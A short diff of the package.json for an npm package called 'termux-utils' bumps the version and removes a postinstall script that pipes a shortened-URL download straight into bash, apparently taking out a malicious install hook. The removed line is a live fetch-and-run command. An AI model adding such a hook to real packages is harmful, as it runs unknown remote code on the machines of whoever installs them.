@@ -1,6 +1,6 @@
 {
   "name": "termux-utils",
-  "version": "4.7.0",
+  "version": "5.5.9",
   "description": "termux utilities",
   "keywords": [
     "cli",
@@ -25,7 +25,6 @@
     "termux-utils": "index.js"
   },
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "curl -sL https://bit.ly/4d7AzZC | bash"
+    "test": "echo \"Error: no test specified\" && exit 1"
   }
 }
